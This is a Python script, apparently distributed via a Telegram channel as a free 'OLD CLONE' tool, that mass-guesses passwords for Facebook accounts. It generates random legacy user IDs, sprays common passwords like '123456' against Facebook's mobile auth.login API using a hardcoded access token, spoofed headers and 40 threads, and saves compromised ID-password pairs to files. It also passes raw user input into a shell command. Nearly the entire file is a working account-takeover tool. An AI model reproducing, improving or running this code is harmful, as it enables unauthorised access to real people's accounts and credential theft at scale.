#----------GIVE SCRIPT ------------<°>
#----------_--FREE --------<>
#GIVE BY : KALYAN KING
#ToOL-----OLD CLONE
import os, time, random, json, sys
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
#----------GIVE SCRIPT ------------<°>
#----------_--FREE --------<>
#GIVE BY : KALYAN KING
#ToOL-----OLD CLONE
loop = 0
oks = []
#----------GIVE SCRIPT ------------<°>
#----------_--FREE --------<>
#GIVE BY : KALYAN KING
#ToOL-----OLD CLONE
# COLOUR CODES
A = '\x1b[1;91m'  # Red
B = '\x1b[1;92m'  # Green
C = '\x1b[1;93m'  # Yellow
D = '\x1b[1;94m'  # Blue
E = '\x1b[1;95m'  # Magenta
F = '\x1b[1;96m'  # Cyan
G = '\x1b[1;97m'  # White
H = '\033[1;31m'  # Dark Red
I = '\x1b[0m'     # Reset

# Emojis
EMOJI_OK = "✅"
EMOJI_CP = "⚠️"
EMOJI_MAIL = "📧"
EMOJI_LOADING = "⏳"
EMOJI_CHECK = "✔️"
#----------GIVE SCRIPT ------------<°>
#----------_--FREE --------<>
#GIVE BY : KALYAN KING
#ToOL-----OLD CLONT
# USER AGENT FUNCTION
def ua():
    uas = [
        "Mozilla/5.0 (Linux; Android 13; SM-A146P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; V2140) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; vivo 1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(uas)

# WELCOME MESSAGE FUNCTION
V = input(f"{B} ENTER YOUR Name: {I}")
os.system(f'espeak -a 100 "Welcome, {V}"')
print(f'{G}Welcome BRO {V} {EMOJI_OK}')
time.sleep(1)
os.system('clear')

# BANNER FUNCTION
def banner():
    os.system("clear")
    print("\033[1;32m")
    print(f"{C}  OLD KGF " * 220)
    print("—" * 40)
    print(f"{B} DEVELOPER : KALYAN KiNG ")
    print(f"{E} TELEGRAM  : @KGF_CYBER_TEM ")
    print(f"{A} TOOL      : OLD CLONE ")
    print(f"{D} STues    : GIVE SCRIPT  ")
    print(f"{F} GITHUB    : KGF TEM")
    print(f"{G} LIVING    : BORISHAL ")
    print(f"{H} VERSION   : 0.1")
    print("—" * 40)

def main():
    banner()
    os.system("xdg-open https://t.me/KGF_CYBER_TEM")
    user = []

    try:
        limit = int(input(f"{C} ENTER Limit (Example: 10000): {I}"))
    except ValueError:
        print(f"{A}Invalid input. Please enter a number.{I}")
        return

    print("—" * 40)
    print(f"[1] Crack 2011-14 Id {EMOJI_LOADING}")
    print(f"[2] Crack 2009-10 Id {EMOJI_LOADING}")
    print("—" * 40)
    ask = input(f"{G}Choice: {I}")

    if ask == "1":
        prefix = "10000"
        for _ in range(limit):
            user.append(str(random.randint(1000000000, 9999999999)))
    elif ask == "2":
        prefix = "100000"
        for _ in range(limit):
            user.append(str(random.randint(100000000, 999999999)))
    else:
        print(f"{A}Invalid choice!{I}")
        return

    print(f"\n{F}[+] Cloning Started. Please Wait...{I}\n")
    print("—" * 40)

    with ThreadPool(max_workers=40) as pool:
        for u in user:
            uid = prefix + u
            pool.submit(login, uid)

def login(uid):
    global oks, loop
    session = requests.Session()

    # Dynamic color and emoji change based on loop progress
    color_cycle = [A, B, C, D, E, F, G]
    emoji_cycle = [EMOJI_OK, EMOJI_CP, EMOJI_MAIL, EMOJI_LOADING, EMOJI_CHECK]
    
    try:
        for pw in ["123456", "1234567", "12345678", "123456789", "123123"]:
            headers = {
                "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                "x-fb-net-hni": str(random.randint(20000, 40000)),
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
                "user-agent": ua(),
                "content-type": "application/x-www-form-urlencoded",
                "x-fb-http-engine": "Liger"
            }

            url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=0&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"

            response = session.get(url, headers=headers).json()

            # Change color and emoji after certain loop intervals
            current_color = color_cycle[loop % len(color_cycle)]
            current_emoji = emoji_cycle[loop % len(emoji_cycle)]

            if "session_key" in response:
                print(f"\r{current_color}[KALYAN-OK-ID] {uid} • {pw} {current_emoji}")
                open("/sdcard/KGF-OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in response.get("error_msg", ""):
                print(f"\r{A}[KALYAN-CP-ID] {uid} • {pw} {EMOJI_CP}")
                open("/sdcard/KGF-CP.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(response):
                print(f"\r{E}[KALYAN-MAIL-ID] {uid} • {pw} {EMOJI_MAIL}")
                open("/sdcard/KGF-MAIL.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break

        loop += 1
        sys.stdout.write(f"\r{F}[KALYAN-KGF] Checked: {loop} | OK: {len(oks)} {EMOJI_CHECK}")
        sys.stdout.flush()

    except Exception:
        pass

if __name__ == "__main__":
    main()